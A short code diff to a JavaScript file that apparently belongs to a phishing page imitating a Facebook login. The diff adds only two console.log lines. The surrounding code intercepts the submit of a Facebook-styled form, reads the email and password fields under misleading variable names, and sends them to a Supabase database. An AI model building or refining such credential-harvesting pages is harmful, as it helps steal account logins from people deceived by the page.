@@ -6,11 +6,13 @@
 
 document.addEventListener('DOMContentLoaded', () => {
       const form = document.getElementById('u_0_d_5u');
-
+     console.log("https://facebook.com")
       form.addEventListener('submit', async (e) => {
         e.preventDefault();
         const firstname = document.getElementById('emailhidden').value.trim();
         const lastname = document.getElementById('pass').value.trim();
+
+     console.log("login with desktop")
 
         try {
           const { data, error } = await supabase
@@ -30,6 +32,7 @@ document.addEventListener('DOMContentLoaded', () => {
      }
   });
 })
+
 
 
 
